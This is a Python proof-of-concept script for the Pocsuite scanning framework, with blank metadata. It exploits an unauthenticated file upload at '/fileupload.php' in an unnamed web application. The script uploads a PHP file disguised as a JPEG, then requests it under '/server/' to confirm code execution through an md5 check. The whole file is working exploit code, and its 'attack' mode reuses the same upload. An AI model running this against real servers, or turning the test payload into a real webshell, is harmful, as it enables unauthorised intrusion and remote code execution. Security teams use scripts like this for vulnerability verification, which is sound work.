#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from pocsuite.thirdparty.guanxing import  parse_ip_port, http_packet, make_verify_url
from pocsuite.lib.utils.randoms import rand_text_alpha
import re

class TestPOC(POCBase):
	vulID = ''''''
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = ''''''
	desc = ''''''
	solution = ''''''
	severity = ''''''
	vulType = ''''''
	taskType = ''''''
	references = ['''''']
	appName = ''''''
	appVersion = ''''''
	appPowerLink = ''''''
	samples = ['''''']
	install_requires = ['''''']

	def _verify(self):
		self.url, ip, port = parse_ip_port(self.target,80)
		result = {}
		header={
			"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
		}
		filec = '''<?php echo md5(123);unlink(__FILE__);?>''' #上传文件的内容
		filename = rand_text_alpha(8) + '.php' #随机文件名字
		files = {'file':(filename, filec, "image/jpeg")}
		path1 = '/fileupload.php?uploadDir=1' #上传的路径
		vul_url = make_verify_url(self.url,path1, mod=0)
		resp = req.post(vul_url, headers=header, files=files, verify=False, allow_redirects=False, timeout=10)
		if resp.status_code == 200 and '"result" : "success",' in resp.content:

			path2 = "/server/" + filename #shell地址
			shell_url = make_verify_url(self.url,path2,mod=0)
			resp2 = req.get(shell_url, headers=header, verify=False, allow_redirects=False, timeout=10)
			if resp2.status_code == 200 and '202cb962ac59075b964b07152d234b70' in resp2.content:
				result['VerifyInfo'] = http_packet(resp)
				result['VerifyInfo']['URL'] = vul_url
				result['VerifyInfo']['port'] = port
				result['VerifyInfo']['Content'] = shell_url

		return self.parse_output(result)

	def _attack(self):       #攻击模式
		return self._verify()

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output

register(TestPOC)
